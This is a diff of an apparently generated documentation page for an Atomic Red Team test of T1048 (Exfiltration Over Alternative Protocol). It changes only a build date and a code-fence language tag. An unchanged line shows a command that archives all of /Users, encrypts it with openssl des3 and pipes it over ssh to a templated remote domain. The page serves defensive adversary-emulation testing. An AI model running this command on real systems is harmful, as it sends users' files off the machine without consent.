@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1048"
 attack_technique_name: "Exfiltration Over Alternative Protocol"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "7c3cb337-35ae-4d06-bf03-3032ed2ec268"
@@ -67,7 +67,7 @@ Upon successful execution, tar will compress /Users/* directory and password pro
 
 ### Command
 
-```sh
+```bash
 tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
 ```
 
